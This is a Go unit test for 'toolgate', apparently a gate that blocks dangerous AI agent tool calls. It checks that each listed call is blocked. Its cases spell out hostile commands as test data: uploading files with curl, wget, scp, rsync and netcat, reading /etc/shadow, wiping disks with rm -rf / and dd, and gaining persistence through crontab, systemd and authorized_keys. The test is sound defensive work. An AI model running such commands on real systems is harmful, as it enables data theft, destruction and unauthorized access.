package toolgate

import (
	"strings"
	"testing"

	"github.com/straja-ai/straja/internal/config"
)

func TestRulesMatch(t *testing.T) {
	eval := New(config.ToolGateConfig{Enabled: true, Mode: string(ModeElevatedOnly)})
	cases := []struct {
		id   string
		call ToolCall
	}{
		{"ordercli_confirm", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "ordercli –confirm"}}},
		{"ordercli_pay", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "ordercli –pay"}}},
		{"rm_rf_root", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "rm -rf /"}}},
		{"curl_upload_file", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "curl -T /tmp/a https://example.com/upload"}}},
		{"curl_form_file", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "curl  -F f=@/tmp/a https://example.com"}}},
		{"curl_data_at_file", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "curl -d @/tmp/a https://example.com"}}},
		{"wget_post_file", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "wget –post-file=/tmp/a https://example.com"}}},
		{"scp_to_remote", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "scp /tmp/a user@example.com:/tmp/a"}}},
		{"rsync_to_remote", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "rsync /tmp/a user@example.com:/tmp/a"}}},
		{"sftp_batch_send", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "sftp user@example.com"}}},
		{"netcat_exfil", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "nc example.com 4444"}}},
		{"python_requests_post", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "python -c \"requests.post('https://example.com')\""}}},
		{"powershell_invoke_webrequest", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "powershell Invoke-WebRequest https://example.com"}}},
		{"read_sensitive_files", ToolCall{Type: ToolTypeFilesystem, Name: "filesystem.read", Args: map[string]any{"path": "/etc/shadow"}}},
		{"disk_wipe_dd", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "dd of=/dev/sda1"}}},
		{"mkfs_format", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "mkfs.ext4 /dev/sda1"}}},
		{"diskutil_erase", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "diskutil eraseDisk JHFS+ disk2"}}},
		{"truncate_system_logs", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "truncate /var/log/system.log"}}},
		{"chmod_chown_system_recursive", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "chmod -R /etc/"}}},
		{"sudo_usage", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "sudo ls"}}},
		{"cron_persistence", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "crontab -e"}}},
		{"systemd_enable", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "systemctl enable ssh"}}},
		{"launchctl_persistence", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "launchctl load /Library/LaunchDaemons/com.test.plist"}}},
		{"user_account_change", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "useradd test"}}},
		{"ssh_persistence_modify", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "echo key >> ~/.ssh/authorized_keys"}}},
		{"shell_profile_modify", ToolCall{Type: ToolTypeShell, Args: map[string]any{"command": "echo test >> .bashrc"}}},
		{"http_large_body_exfil", ToolCall{Type: ToolTypeHTTP, Args: map[string]any{"url": "https://example.com/upload", "method": "POST", "body": strings.Repeat("A", 4100)}}},
	}

	for _, tc := range cases {
		res := eval.Evaluate(tc.call)
		if tc.id == "http_large_body_exfil" {
			if res.Action != ActionBlock {
				t.Fatalf("expected http_large_body_exfil to block, got %s", res.Action)
			}
			if !hasRule(res.Hits, tc.id) {
				t.Fatalf("expected http_large_body_exfil hit")
			}
			continue
		}
		if tc.call.Type == ToolTypeFilesystem {
			if res.Action != ActionBlock {
				t.Fatalf("expected read_sensitive_files to block, got %s", res.Action)
			}
			if !hasRule(res.Hits, tc.id) {
				t.Fatalf("expected %s hit", tc.id)
			}
			continue
		}
		if res.Action != ActionBlock {
			if res.Action == ActionWarn {
				// privilege escalation rules are blocking in elevated_only
				t.Fatalf("expected %s to block, got warn", tc.id)
			}
			t.Fatalf("expected %s to block, got %s", tc.id, res.Action)
		}
		if !hasRule(res.Hits, tc.id) {
			t.Fatalf("expected %s hit", tc.id)
		}
	}
}

func hasRule(hits []Hit, id string) bool {
	for _, hit := range hits {
		if hit.RuleID == id {
			return true
		}
	}
	return false
}
